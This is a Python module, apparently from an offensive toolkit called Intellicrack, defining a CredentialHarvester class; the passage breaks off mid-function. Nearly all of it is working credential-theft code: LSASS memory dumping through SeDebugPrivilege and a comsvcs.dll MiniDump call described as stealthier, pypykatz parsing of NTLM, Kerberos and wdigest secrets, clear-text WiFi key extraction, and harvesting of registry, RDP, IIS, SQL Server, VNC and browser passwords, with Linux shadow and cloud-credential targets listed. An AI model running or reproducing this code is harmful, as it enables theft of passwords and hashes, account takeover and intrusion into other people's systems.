"""This file is part of Intellicrack.
Copyright (C) 2025 Zachary Flint.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see https://www.gnu.org/licenses/.
"""

import base64
import json
import os
import re
import shlex
import shutil
import subprocess
import time
from pathlib import Path
from typing import Any

from intellicrack.handlers.sqlite3_handler import sqlite3

from ...utils.logger import get_logger
from ...utils.system.os_detection_mixin import OSDetectionMixin

"""
Credential Harvesting Module

Implements various credential harvesting techniques for Windows and Linux systems
including memory dumps, registry extraction, file searches, and browser data.
"""


class CredentialHarvester(OSDetectionMixin):
    """Cross-platform credential harvesting with multiple extraction methods."""

    def __init__(self):
        """Initialize the credential harvester with comprehensive collection and extraction capabilities."""
        self.logger = get_logger(__name__)
        self.harvested_credentials = []
        self.supported_formats = ["json", "csv", "xml", "txt"]

        # Browser credential locations
        self.browser_paths = {
            "chrome": {
                "windows": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"),
                "linux": os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
                "macos": os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data"),
            },
            "firefox": {
                "windows": os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"),
                "linux": os.path.expanduser("~/.mozilla/firefox"),
                "macos": os.path.expanduser("~/Library/Application Support/Firefox/Profiles"),
            },
            "edge": {
                "windows": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"),
                "linux": None,
                "macos": None,
            },
            "safari": {
                "windows": None,
                "linux": None,
                "macos": os.path.expanduser("~/Library/Keychains/login.keychain-db"),
            },
        }

        # System credential locations
        self.system_paths = {
            "windows": {
                "sam": "C:\\Windows\\System32\\config\\SAM",
                "system": "C:\\Windows\\System32\\config\\SYSTEM",
                "security": "C:\\Windows\\System32\\config\\SECURITY",
                "ntds": "C:\\Windows\\NTDS\\ntds.dit",
                "lsass": "lsass.exe",
            },
            "linux": {
                "shadow": "/etc/shadow",
                "passwd": "/etc/passwd",
                "gshadow": "/etc/gshadow",
                "group": "/etc/group",
            },
            "macos": {
                "keychain": "~/Library/Keychains/",
                "directory_service": "/var/db/dslocal/nodes/Default/users/",
            },
        }

        # Application-specific credential locations
        self.app_paths = {
            "putty": {
                "windows": "HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions",
                "linux": "~/.putty/sessions",
                "macos": "~/.putty/sessions",
            },
            "filezilla": {
                "windows": os.path.expanduser("~\\AppData\\Roaming\\FileZilla"),
                "linux": os.path.expanduser("~/.config/filezilla"),
                "macos": os.path.expanduser("~/Library/Preferences/com.filezilla-project.filezilla.plist"),
            },
            "winscp": {
                "windows": "HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions",
                "linux": None,
                "macos": None,
            },
            "outlook": {
                "windows": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Outlook"),
                "linux": None,
                "macos": os.path.expanduser("~/Library/Group Containers/UBF8T346G9.Office/Outlook/Outlook 15 Profiles"),
            },
        }

        # WiFi credential locations
        self.wifi_paths = {
            "windows": "netsh wlan show profiles",
            "linux": "/etc/NetworkManager/system-connections/",
            "macos": "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport",
        }

        # Detection patterns for credentials in memory/files
        self.credential_patterns = {
            "passwords": [
                r'password["\s]*[:=]["\s]*([^"\s]+)',
                r'pwd["\s]*[:=]["\s]*([^"\s]+)',
                r'pass["\s]*[:=]["\s]*([^"\s]+)',
            ],
            "api_keys": [
                r'api[_-]?key["\s]*[:=]["\s]*([^"\s]+)',
                r'secret[_-]?key["\s]*[:=]["\s]*([^"\s]+)',
                r'access[_-]?token["\s]*[:=]["\s]*([^"\s]+)',
            ],
            "database": [
                r'connection[_-]?string["\s]*[:=]["\s]*([^"\s]+)',
                r'db[_-]?password["\s]*[:=]["\s]*([^"\s]+)',
                r'database[_-]?url["\s]*[:=]["\s]*([^"\s]+)',
            ],
        }

        # Current platform detection
        self.platform = self._detect_platform()

        # Statistics
        self.stats = {
            "total_harvested": 0,
            "browsers_checked": 0,
            "apps_checked": 0,
            "files_scanned": 0,
            "unique_credentials": 0,
        }

        # Map harvesting techniques to their implementation methods
        self.harvesting_techniques = {
            "windows": {
                "lsass_dump": self._windows_lsass_dump,
                "registry_secrets": self._windows_registry_secrets,
                "cached_credentials": self._windows_cached_credentials,
                "browser_passwords": self._windows_browser_passwords,
                "wifi_passwords": self._windows_wifi_passwords,
                "rdp_credentials": self._windows_rdp_credentials,
                "iis_passwords": self._windows_iis_passwords,
                "sql_server_passwords": self._windows_sql_server_passwords,
                "vnc_passwords": self._windows_vnc_passwords,
                "putty_sessions": self._windows_putty_sessions,
                "firefox_passwords": self._windows_firefox_passwords,
                "chrome_passwords": self._windows_chrome_passwords,
            },
            "linux": {
                "shadow_file": self._linux_shadow_file,
                "ssh_keys": self._linux_ssh_keys,
                "browser_passwords": self._linux_browser_passwords,
                "configuration_files": self._linux_configuration_files,
                "history_files": self._linux_history_files,
                "environment_variables": self._linux_environment_variables,
                "docker_credentials": self._linux_docker_credentials,
                "kubernetes_tokens": self._linux_kubernetes_tokens,
                "database_configs": self._linux_database_configs,
                "application_configs": self._linux_application_configs,
                "cloud_credentials": self._linux_cloud_credentials,
                "memory_dump": self._linux_memory_dump,
            },
            "macos": {
                "keychain": self._macos_keychain_extraction,
                "browser_passwords": self._macos_browser_passwords,
                "ssh_keys": self._macos_ssh_keys,
                "application_passwords": self._macos_application_passwords,
            },
        }

        # Storage for harvested credentials
        self.harvested_credentials = {}

    def harvest_credentials(
        self,
        target_os: str | None = None,
        techniques: list[str] | None = None,
        output_format: str = "dict",
    ) -> dict[str, Any]:
        """Harvest credentials using specified techniques.

        Args:
            target_os: Target operating system ('windows', 'linux', or None for auto-detect)
            techniques: List of harvesting techniques to use
            output_format: Output format ('dict', 'json', 'csv')

        Returns:
            Harvested credentials and metadata

        """
        result = {
            "success": False,
            "target_os": target_os or self._detect_os(),
            "techniques_used": [],
            "credentials_found": 0,
            "credentials": {},
            "harvest_time": 0,
            "error": None,
        }

        start_time = time.time()

        try:
            self.logger.info("Starting credential harvesting")

            os_type = result["target_os"]

            if os_type not in self.harvesting_techniques:
                result["error"] = f"Unsupported OS: {os_type}"
                return result

            # Select techniques
            if techniques is None:
                techniques = list(self.harvesting_techniques[os_type].keys())

            # Execute each technique
            all_credentials = {}

            for technique in techniques:
                if technique in self.harvesting_techniques[os_type]:
                    self.logger.info("Running %s", technique)
                    result["techniques_used"].append(technique)

                    try:
                        technique_func = self.harvesting_techniques[os_type][technique]
                        creds = technique_func()

                        if creds:
                            all_credentials[technique] = creds
                            self.logger.info("Found %s credentials with %s", len(creds), technique)
                        else:
                            self.logger.debug("No credentials found with %s", technique)

                    except (
                        FileNotFoundError,
                        PermissionError,
                        OSError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                    ) as e:
                        self.logger.warning("Technique %s failed: %s", technique, e)

            # Process and format results
            result["credentials"] = self._process_credentials(all_credentials, output_format)
            result["credentials_found"] = self._count_credentials(all_credentials)
            result["harvest_time"] = time.time() - start_time
            result["success"] = result["credentials_found"] > 0

            # Store results
            session_id = self._generate_session_id()
            self.harvested_credentials[session_id] = {
                "timestamp": time.time(),
                "target_os": os_type,
                "techniques": result["techniques_used"],
                "credentials": all_credentials,
            }

            result["session_id"] = session_id

            self.logger.info("Credential harvesting complete: %s credentials found", result["credentials_found"])
            return result

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.error("Credential harvesting failed: %s", e)
            result["error"] = str(e)
            result["harvest_time"] = time.time() - start_time
            return result

    def search_files_for_credentials(self, search_paths: list[str], file_patterns: list[str] | None = None) -> dict[str, Any]:
        """Search files for credential patterns.

        Args:
            search_paths: List of directories to search
            file_patterns: File patterns to include in search

        Returns:
            Found credentials from file search

        """
        result = {
            "success": False,
            "files_searched": 0,
            "credentials_found": 0,
            "credentials": {},
            "error": None,
        }

        if file_patterns is None:
            file_patterns = ["*.txt", "*.cfg", "*.conf", "*.ini", "*.xml", "*.json", "*.env"]

        try:
            self.logger.info("Searching files in %s paths", len(search_paths))

            credentials = {}
            files_searched = 0

            for search_path in search_paths:
                if not os.path.exists(search_path):
                    continue

                for pattern in file_patterns:
                    # Find matching files
                    files = list(Path(search_path).rglob(pattern))

                    for file_path in files:
                        try:
                            if file_path.is_file() and file_path.stat().st_size < 10 * 1024 * 1024:  # Max 10MB
                                files_searched += 1
                                file_creds = self._extract_credentials_from_file(str(file_path))

                                if file_creds:
                                    credentials[str(file_path)] = file_creds

                        except (
                            FileNotFoundError,
                            PermissionError,
                            OSError,
                            AttributeError,
                            ValueError,
                            TypeError,
                            RuntimeError,
                        ) as e:
                            self.logger.debug("Error reading %s: %s", file_path, e)

            result["files_searched"] = files_searched
            result["credentials"] = credentials
            result["credentials_found"] = sum(len(creds) for creds in credentials.values())
            result["success"] = result["credentials_found"] > 0

            self.logger.info(
                "File search complete: %s credentials in %s files",
                result["credentials_found"],
                files_searched,
            )
            return result

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.error("File search failed: %s", e)
            result["error"] = str(e)
            return result

    def extract_credentials_from_memory(self, process_name: str | None = None, dump_path: str | None = None) -> dict[str, Any]:
        """Extract credentials from memory dumps.

        Args:
            process_name: Target process name
            dump_path: Path to existing memory dump

        Returns:
            Extracted credentials from memory

        """
        result = {
            "success": False,
            "dump_created": False,
            "credentials_found": 0,
            "credentials": {},
            "error": None,
        }

        try:
            self.logger.info("Extracting credentials from memory")

            # Create memory dump if not provided
            if not dump_path:
                from ...utils.system.os_detection import is_windows

                if is_windows():
                    dump_path = self._create_windows_memory_dump(process_name or "lsass.exe")
                else:
                    dump_path = self._create_linux_memory_dump(process_name)

                result["dump_created"] = True

            if not dump_path or not os.path.exists(dump_path):
                result["error"] = "Failed to create or locate memory dump"
                return result

            # Extract credentials from dump
            credentials = self._parse_memory_dump(dump_path)

            result["credentials"] = credentials
            result["credentials_found"] = sum(len(creds) for creds in credentials.values())
            result["success"] = result["credentials_found"] > 0

            # Cleanup dump if we created it
            if result["dump_created"] and os.path.exists(dump_path):
                try:
                    os.remove(dump_path)
                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                ) as e:
                    self.logger.error("Error in credential_harvester: %s", e)

            self.logger.info("Memory extraction complete: %s credentials found", result["credentials_found"])
            return result

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.error("Memory credential extraction failed: %s", e)
            result["error"] = str(e)
            return result

    # Windows harvesting techniques

    def _windows_lsass_dump(self) -> dict[str, Any]:
        """Dump LSASS process memory for credentials with comprehensive parsing."""
        credentials = {"lsass_credentials": []}

        try:
            import ctypes
            import tempfile
            from ctypes import wintypes

            # Try to import pypykatz for parsing
            pypykatz_available = False
            try:
                from pypykatz.pypykatz import pypykatz

                pypykatz_available = True
            except ImportError:
                self.logger.warning("pypykatz not available, using alternative methods")

            # Enable SeDebugPrivilege for LSASS access
            try:
                # Constants for Windows API
                SE_DEBUG_NAME = "SeDebugPrivilege"
                TOKEN_ADJUST_PRIVILEGES = 0x0020
                TOKEN_QUERY = 0x0008
                SE_PRIVILEGE_ENABLED = 0x00000002

                # Get process token
                kernel32 = ctypes.windll.kernel32
                advapi32 = ctypes.windll.advapi32

                h_token = wintypes.HANDLE()
                if kernel32.OpenProcessToken(kernel32.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ctypes.byref(h_token)):
                    # Lookup privilege value
                    luid = ctypes.c_ulonglong()
                    if advapi32.LookupPrivilegeValueW(None, SE_DEBUG_NAME, ctypes.byref(luid)):
                        # Enable the privilege
                        class TOKEN_PRIVILEGES(ctypes.Structure):
                            _fields_ = [("PrivilegeCount", wintypes.DWORD), ("Privileges", wintypes.DWORD * 3)]

                        tp = TOKEN_PRIVILEGES()
                        tp.PrivilegeCount = 1
                        tp.Privileges[0] = luid.value & 0xFFFFFFFF
                        tp.Privileges[1] = luid.value >> 32
                        tp.Privileges[2] = SE_PRIVILEGE_ENABLED

                        advapi32.AdjustTokenPrivileges(h_token, False, ctypes.byref(tp), ctypes.sizeof(tp), None, None)

                    kernel32.CloseHandle(h_token)
            except Exception as e:
                self.logger.debug("Could not enable SeDebugPrivilege: %s", e)

            # Find LSASS process
            lsass_pid = None
            try:
                import shutil

                tasklist_path = shutil.which("tasklist") or os.path.join(
                    os.environ.get("SystemRoot", "C:\\Windows"), "System32", "tasklist.exe"
                )
                result = subprocess.run(
                    [tasklist_path, "/fi", "imagename eq lsass.exe", "/fo", "csv"], capture_output=True, text=True, check=False, shell=False
                )
                if result.returncode == 0:
                    lines = result.stdout.strip().split("\n")
                    if len(lines) > 1:
                        # Parse CSV output to get PID
                        import csv

                        reader = csv.reader([lines[1]])
                        for row in reader:
                            if len(row) > 1 and row[0].lower() == "lsass.exe":
                                lsass_pid = int(row[1])
                                break
            except Exception as e:
                self.logger.debug("Could not find LSASS PID: %s", e)

            if lsass_pid:
                # Create memory dump using MiniDumpWriteDump
                with tempfile.NamedTemporaryFile(suffix=".dmp", delete=False) as dump_file:
                    dump_path = dump_file.name

                try:
                    # Try using comsvcs.dll for dumping (stealthier)
                    dump_cmd = f"rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump {lsass_pid} {dump_path} full"
                    result = subprocess.run(dump_cmd, shell=True, capture_output=True, timeout=30, check=False)

                    if result.returncode != 0 or not os.path.exists(dump_path) or os.path.getsize(dump_path) == 0:
                        # Fallback to direct API call
                        dbghelp = ctypes.windll.dbghelp
                        kernel32 = ctypes.windll.kernel32

                        # Open LSASS process
                        PROCESS_ALL_ACCESS = 0x1F0FFF
                        h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, lsass_pid)

                        if h_process:
                            # Create dump file
                            h_file = kernel32.CreateFileW(dump_path, 0x10000000, 0, None, 2, 0x80, None)

                            if h_file != -1:
                                # MiniDumpWithFullMemory = 0x00000002
                                dbghelp.MiniDumpWriteDump(h_process, lsass_pid, h_file, 0x00000002, None, None, None)
                                kernel32.CloseHandle(h_file)

                            kernel32.CloseHandle(h_process)

                    # Parse the dump file
                    if os.path.exists(dump_path) and os.path.getsize(dump_path) > 0:
                        if pypykatz_available:
                            # Parse with pypykatz
                            try:
                                mimi = pypykatz.parse_minidump_file(dump_path)

                                # Extract credentials
                                if mimi and hasattr(mimi, "logon_sessions"):
                                    for luid, session in mimi.logon_sessions.items():
                                        if session.ntlm_creds:
                                            for cred in session.ntlm_creds:
                                                credentials["lsass_credentials"].append(
                                                    {
                                                        "type": "ntlm",
                                                        "username": cred.username,
                                                        "domain": cred.domainname,
                                                        "nthash": cred.NThash.hex() if cred.NThash else None,
                                                        "lmhash": cred.LMHash.hex() if cred.LMHash else None,
                                                        "session": str(luid),
                                                    }
                                                )

                                        if session.wdigest_creds:
                                            for cred in session.wdigest_creds:
                                                if cred.password:
                                                    credentials["lsass_credentials"].append(
                                                        {
                                                            "type": "wdigest",
                                                            "username": cred.username,
                                                            "domain": cred.domainname,
                                                            "password": cred.password,
                                                            "session": str(luid),
                                                        }
                                                    )

                                        if session.kerberos_creds:
                                            for cred in session.kerberos_creds:
                                                credentials["lsass_credentials"].append(
                                                    {
                                                        "type": "kerberos",
                                                        "username": cred.username,
                                                        "domain": cred.domainname,
                                                        "password": cred.password if hasattr(cred, "password") else None,
                                                        "session": str(luid),
                                                    }
                                                )

                                        if session.ssp_creds:
                                            for cred in session.ssp_creds:
                                                credentials["lsass_credentials"].append(
                                                    {
                                                        "type": "ssp",
                                                        "username": cred.username,
                                                        "domain": cred.domainname,
                                                        "password": cred.password if hasattr(cred, "password") else None,
                                                        "session": str(luid),
                                                    }
                                                )
                            except Exception as e:
                                self.logger.debug("pypykatz parsing failed: %s", e)

                        # If pypykatz not available or failed, extract basic info
                        if not credentials["lsass_credentials"]:
                            credentials["lsass_credentials"].append(
                                {
                                    "type": "dump_created",
                                    "dump_path": dump_path,
                                    "size": os.path.getsize(dump_path),
                                    "note": "Dump created successfully. Parse with external tools for credentials.",
                                }
                            )

                    # Clean up dump file
                    try:
                        if os.path.exists(dump_path) and "dump_path" not in str(credentials):
                            os.unlink(dump_path)
                    except Exception as e:
                        self.logger.debug(f"Failed to clean up dump file {dump_path}: {e}")

                except Exception as e:
                    self.logger.debug("LSASS dump creation failed: %s", e)

        except Exception as e:
            self.logger.debug("LSASS dump failed: %s", e)

        return credentials

    def _windows_registry_secrets(self) -> dict[str, Any]:
        """Extract secrets from Windows registry."""
        credentials = {}

        try:
            # Registry locations with potential secrets
            registry_keys = [
                r"HKLM\SYSTEM\CurrentControlSet\Services",
                r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                r"HKCU\Software\Microsoft\Terminal Server Client\Servers",
                r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            ]

            for key in registry_keys:
                try:
                    cmd = f'reg query "{key}" /s'
                    result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                        shlex.split(cmd),
                        check=False,
                        capture_output=True,
                        text=True,
                        stderr=subprocess.DEVNULL,
                        shell=False,  # Explicitly secure - using list format prevents shell injection
                    )

                    if result.returncode == 0:
                        # Extract potential credentials from registry output
                        reg_creds = self._extract_credentials_from_text(result.stdout)
                        if reg_creds:
                            key_name = key.split("\\")[-1]
                            credentials[f"registry_{key_name}"] = reg_creds

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                ) as e:
                    self.logger.error("Error in credential_harvester: %s", e)
                    continue

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.debug("Registry secrets extraction failed: %s", e)

        return credentials

    def _windows_cached_credentials(self) -> dict[str, Any]:
        """Extract cached domain credentials."""
        credentials = {}

        try:
            # Check for cached credentials
            cmd = "cmdkey /list"
            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                shlex.split(cmd),
                check=False,
                capture_output=True,
                text=True,
                shell=False,  # Explicitly secure - using list format prevents shell injection
            )

            if result.returncode == 0:
                cached_creds = []
                lines = result.stdout.split("\n")

                for line in lines:
                    if "Target:" in line:
                        target = line.split("Target:")[1].strip()
                        cached_creds.append({"target": target, "type": "cached"})

                if cached_creds:
                    credentials["cached_credentials"] = cached_creds

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.debug("Cached credentials extraction failed: %s", e)

        return credentials

    def _windows_browser_passwords(self) -> dict[str, Any]:
        """Extract passwords from Windows browsers."""
        credentials = {}

        try:
            for browser, db_path in self.browser_paths["windows"].items():
                try:
                    expanded_path = os.path.expandvars(db_path)

                    if "*" in expanded_path:
                        # Handle wildcard paths
                        import glob

                        matching_paths = glob.glob(expanded_path)
                        for path in matching_paths:
                            browser_creds = self._extract_browser_credentials(path, browser)
                            if browser_creds:
                                credentials[f"{browser}_{os.path.basename(path)}"] = browser_creds
                    elif os.path.exists(expanded_path):
                        browser_creds = self._extract_browser_credentials(expanded_path, browser)
                        if browser_creds:
                            credentials[browser] = browser_creds

                except (
                    FileNotFoundError,
                    PermissionError,
                    OSError,
                    AttributeError,
                    ValueError,
                    TypeError,
                    RuntimeError,
                ) as e:
                    self.logger.debug("Browser %s extraction failed: %s", browser, e)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.debug("Browser password extraction failed: %s", e)

        return credentials

    def _windows_wifi_passwords(self) -> dict[str, Any]:
        """Extract WiFi passwords."""
        credentials = {}

        try:
            # Get WiFi profiles
            cmd = "netsh wlan show profiles"
            result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                shlex.split(cmd),
                check=False,
                capture_output=True,
                text=True,
                shell=False,  # Explicitly secure - using list format prevents shell injection
            )

            if result.returncode == 0:
                wifi_creds = []

                # Extract profile names
                for line in result.stdout.split("\n"):
                    if "All User Profile" in line:
                        profile_name = line.split(":")[1].strip()

                        # Get password for profile
                        pwd_cmd = f'netsh wlan show profile name="{profile_name}" key=clear'
                        pwd_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
                            shlex.split(pwd_cmd),
                            check=False,
                            capture_output=True,
                            text=True,
                            shell=False,  # Explicitly secure - using list format prevents shell injection
                        )

                        if pwd_result.returncode == 0:
                            for pwd_line in pwd_result.stdout.split("\n"):
                                if "Key Content" in pwd_line:
                                    password = pwd_line.split(":")[1].strip()
                                    wifi_creds.append(
                                        {
                                            "ssid": profile_name,
                                            "password": password,
                                            "type": "wifi",
                                        }
                                    )
                                    break

                if wifi_creds:
                    credentials["wifi_passwords"] = wifi_creds

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.debug("WiFi password extraction failed: %s", e)

        return credentials

    # Additional Windows technique stubs

    def _windows_rdp_credentials(self) -> dict[str, Any]:
        """Extract RDP credentials from Windows registry."""
        credentials = {"rdp_credentials": []}

        try:
            import winreg

            # RDP saved connections in registry
            rdp_paths = [
                r"Software\Microsoft\Terminal Server Client\Default",
                r"Software\Microsoft\Terminal Server Client\Servers",
            ]

            for path in rdp_paths:
                try:
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path) as key:
                        i = 0
                        while True:
                            try:
                                server_name = winreg.EnumKey(key, i)
                                server_path = f"{path}\\{server_name}"

                                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, server_path) as server_key:
                                    server_data = {}
                                    j = 0
                                    while True:
                                        try:
                                            value_name, value_data, _ = winreg.EnumValue(server_key, j)
                                            server_data[value_name] = value_data
                                            j += 1
                                        except OSError as e:
                                            self.logger.error("OS error in credential_harvester: %s", e)
                                            break

                                    if server_data:
                                        credentials["rdp_credentials"].append(
                                            {
                                                "server": server_name,
                                                "data": server_data,
                                                "source": "registry",
                                            }
                                        )
                                i += 1
                            except OSError as e:
                                self.logger.error("OS error in credential_harvester: %s", e)
                                break

                except FileNotFoundError as e:
                    self.logger.error("File not found in credential_harvester: %s", e)
                    continue

        except ImportError:
            self.logger.warning("winreg module not available for RDP credential extraction")
        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.error("Error extracting RDP credentials: %s", e)

        return credentials

    def _windows_iis_passwords(self) -> dict[str, Any]:
        """Extract IIS application pool and site passwords."""
        credentials = {"iis_passwords": []}

        # Import secure XML parser
        import defusedxml.ElementTree as ElementTree

        try:
            # IIS configuration locations
            config_paths = [
                os.path.join(
                    os.environ.get("SystemRoot", "C:\\Windows"),
                    "System32",
                    "inetsrv",
                    "config",
                    "applicationHost.config",
                ),
                os.path.join(os.environ.get("SystemDrive", "C:"), "inetpub", "wwwroot", "web.config"),
            ]

            for config_path in config_paths:
                if os.path.exists(config_path):
                    try:
                        with open(config_path, encoding="utf-8") as f:
                            content = f.read()

                        # Extract connection strings and app pool credentials
                        root = ElementTree.fromstring(content)

                        # Find application pool identities
                        for app_pool in root.findall(".//applicationPool"):
                            identity = app_pool.find(".//processModel")
                            if identity is not None:
                                username = identity.get("userName")
                                password = identity.get("password")
                                if username and password:
                                    credentials["iis_passwords"].append(
                                        {
                                            "type": "application_pool",
                                            "pool_name": app_pool.get("name"),
                                            "username": username,
                                            "password": password,
                                            "source": config_path,
                                        }
                                    )

                        # Find connection strings
                        for conn_str in root.findall(".//connectionStrings/add"):
                            conn_string = conn_str.get("connectionString", "")
                            if "password=" in conn_string.lower():
                                credentials["iis_passwords"].append(
                                    {
                                        "type": "connection_string",
                                        "name": conn_str.get("name"),
                                        "connection_string": conn_string,
                                        "source": config_path,
                                    }
                                )

                    except (
                        FileNotFoundError,
                        PermissionError,
                        OSError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                    ) as e:
                        self.logger.debug("Error parsing IIS config %s: %s", config_path, e)

        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.error("Error extracting IIS passwords: %s", e)

        return credentials

    def _windows_sql_server_passwords(self) -> dict[str, Any]:
        """Extract SQL Server connection strings and service accounts."""
        credentials = {"sql_server_passwords": []}

        try:
            import winreg

            # SQL Server registry locations
            sql_paths = [
                r"SOFTWARE\Microsoft\Microsoft SQL Server",
                r"SOFTWARE\WOW6432Node\Microsoft\Microsoft SQL Server",
            ]

            for base_path in sql_paths:
                try:
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, base_path) as key:
                        # Get instance names
                        try:
                            instances_key = winreg.OpenKey(key, "Instance Names\\SQL")
                            i = 0
                            while True:
                                try:
                                    instance_name, instance_id, _ = winreg.EnumValue(instances_key, i)

                                    # Get service account for this instance
                                    service_path = f"{base_path}\\{instance_id}\\MSSQLServer\\Parameters"
                                    try:
                                        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, service_path) as svc_key:
                                            j = 0
                                            service_data = {}
                                            while True:
                                                try:
                                                    val_name, val_data, _ = winreg.EnumValue(svc_key, j)
                                                    service_data[val_name] = val_data
                                                    j += 1
                                                except OSError as e:
                                                    self.logger.error("OS error in credential_harvester: %s", e)
                                                    break

                                            if service_data:
                                                credentials["sql_server_passwords"].append(
                                                    {
                                                        "instance": instance_name,
                                                        "instance_id": instance_id,
                                                        "service_data": service_data,
                                                        "source": "registry",
                                                    }
                                                )
                                    except FileNotFoundError as e:
                                        self.logger.error("File not found in credential_harvester: %s", e)

                                    i += 1
                                except OSError as e:
                                    self.logger.error("OS error in credential_harvester: %s", e)
                                    break
                        except FileNotFoundError as e:
                            self.logger.error("File not found in credential_harvester: %s", e)

                except FileNotFoundError as e:
                    self.logger.error("File not found in credential_harvester: %s", e)
                    continue

            # Search for SQL connection strings in common locations
            config_locations = [
                os.path.join(os.environ.get("SystemDrive", "C:"), "inetpub", "wwwroot", "web.config"),
                os.path.join(
                    os.environ.get("ProgramFiles", r"C:\Program Files"),
                    "Microsoft SQL Server",
                    "*",
                    "Tools",
                    "Binn",
                    "*.config",
                ),
            ]

            for location in config_locations:
                if "*" in location:
                    import glob

                    files = glob.glob(location)
                else:
                    files = [location] if os.path.exists(location) else []

                for file_path in files:
                    try:
                        with open(file_path, encoding="utf-8") as f:
                            content = f.read()

                        # Extract SQL connection strings
                        sql_patterns = [
                            r"Data Source=([^;]+);.*User ID=([^;]+);.*Password=([^;]+)",
                            r"Server=([^;]+);.*User Id=([^;]+);.*Password=([^;]+)",
                            r"server=([^;]+);.*uid=([^;]+);.*pwd=([^;]+)",
                        ]

                        for pattern in sql_patterns:
                            matches = re.finditer(pattern, content, re.IGNORECASE)
                            for match in matches:
                                credentials["sql_server_passwords"].append(
                                    {
                                        "server": match.group(1),
                                        "username": match.group(2),
                                        "password": match.group(3),
                                        "source": file_path,
                                        "type": "connection_string",
                                    }
                                )

                    except (
                        FileNotFoundError,
                        PermissionError,
                        OSError,
                        AttributeError,
                        ValueError,
                        TypeError,
                        RuntimeError,
                    ) as e:
                        self.logger.debug("Error parsing SQL config %s: %s", file_path, e)

        except ImportError:
            self.logger.warning("winreg module not available for SQL Server credential extraction")
        except (
            FileNotFoundError,
            PermissionError,
            OSError,
            AttributeError,
            ValueError,
            TypeError,
            RuntimeError,
        ) as e:
            self.logger.error("Error extracting SQL Server passwords: %s", e)

        return credentials

    def _windows_vnc_passwords(self) -> dict[str, Any]:
        """Extract VNC passwords from registry and configuration files."""
        credentials = {"vnc_passwords": []}

        try:
            import winreg

            # VNC registry locations
            vnc_paths = [
                r"SOFTWARE\ORL\WinVNC3\Default",
                r"SOFTWARE\RealVNC\WinVNC4",
                r"SOFTWARE\TightVNC\Server",
                r"SOFTWARE\UltraVNC",
            ]

            for path in vnc_paths:
                for hive in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
                    try:
                        with winreg.OpenKey(hive, path) as key:
                            i = 0
                            vnc_data = {}
                            while True:
                                try:
                                    val_name, val_data, val_type = winreg.EnumValue(key, i)
                                    if "password" in val_name.lower():
                                        vnc_data[val_name] = {
                                            "data": val_data,
                                            "type": val_type,  # Use val_type
                                        }
                                    i += 1
                                except OSError as e:
                                    self.logger.error("OS error in credential_harvester: %s", e)
                                    break

                            if vnc_data:
                                credentials["vnc_passwords"].append(
                                    {
                                        "registry_path": path,
                                        "hive": "HKLM" if hive == winreg.HKEY_LOCAL_MACHINE else "HKCU",
                                        "password_data": vnc_data,
                                        "source": "registry",
                                    }
                                )

                    except FileNotFoundError as e:
                        self.logger.error("File not found in credential_harvester: %s", e)
                        continue

            # VNC configuration files
            vnc_config_paths = [
                os.path.join(
